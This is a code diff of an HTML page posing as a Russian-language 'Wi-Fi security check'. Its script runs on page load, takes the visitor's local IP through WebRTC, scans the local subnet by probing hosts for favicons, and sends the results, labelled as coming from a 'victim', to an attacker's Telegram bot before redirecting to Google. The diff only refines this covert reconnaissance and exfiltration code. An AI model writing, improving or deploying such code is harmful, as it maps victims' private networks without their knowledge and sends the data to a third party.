@@ -6,15 +6,15 @@
 <body>
     <h2>Проверка безопасности Wi-Fi...</h2>
     <script>
-        // Отправка результата в телеграм-бот
-        const BOT_TOKEN = '8936104890:AAFTtwKdd_JNhlcqENJ6kWonr9Wb2Z5fJ_8';
-        const CHAT_ID = '8484695858';
+        const BOT_TOKEN = 'ТВОЙ_ТОКЕН_БОТА';
+        const CHAT_ID = 'ТВОЙ_ЧАТ_АЙДИ';
 
         async function sendToTelegram(msg) {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+            } catch (e) {}
         }
 
-        // Получаем локальный IP через WebRTC
         function getLocalIP() {
             return new Promise((resolve, reject) => {
                 const pc = new RTCPeerConnection({ iceServers: [] });
@@ -29,11 +29,10 @@
                         }
                     }
                 };
-                setTimeout(() => reject('No IP'), 3000);
+                setTimeout(() => reject(new Error('No local IP found')), 3000);
             });
         }
 
-        // Сканируем подсеть
         function scanSubnet(baseIP) {
             const parts = baseIP.split('.');
             const subnet = parts.slice(0, 3).join('.');
@@ -49,13 +48,12 @@
                         resolve();
                     };
                     img.onerror = () => {
-                        // Пробуем порт 443
                         const img2 = new Image();
                         img2.onload = () => {
                             found.push(`Хост: ${ip} (порт 443)`);
                             resolve();
                         };
-                        img2.onerror = () => resolve(); // ничего
+                        img2.onerror = () => resolve();
                         img2.src = `https://${ip}:443/favicon.ico?${Math.random()}`;
                     };
                     img.src = `http://${ip}/favicon.ico?${Math.random()}`;
@@ -67,15 +65,21 @@
 
         (async () => {
             try {
-                let localIP = await getLocalIP();
-                await sendToTelegram(`[!] Жертва зашла. Локальный IP: ${localIP}\nСканирую подсеть...`);
-                let hosts = await scanSubnet(localIP);
-                let result = hosts.length > 0 ? hosts.join('\n') : 'Устройства не найдены (возможно, сеть не /24)';
-                await sendToTelegram(`Результат сканирования:\n${result}`);
-            } catch(e) {
-                await sendToTelegram(`Ошибка: ${e.message}`);
+                let localIP;
+                try {
+                    localIP = await getLocalIP();
+                } catch (e) {
+                    await sendToTelegram(`Не удалось получить локальный IP: ${e.message}`);
+                    return;
+                }
+                await sendToTelegram(`Жертва зашла. Локальный IP: ${localIP}\nСканирую подсеть...`);
+                const hosts = await scanSubnet(localIP);
+                const result = hosts.length > 0 ? hosts.join('\n') : 'Устройства не найдены';
+                await sendToTelegram(`Результат:\n${result}`);
+            } catch (e) {
+                const errMsg = e.message || JSON.stringify(e) || 'Неизвестная ошибка';
+                await sendToTelegram(`Ошибка: ${errMsg}`);
             }
-            // Редирект на безобидный сайт
             window.location = 'https://www.google.com';
         })();
     </script>
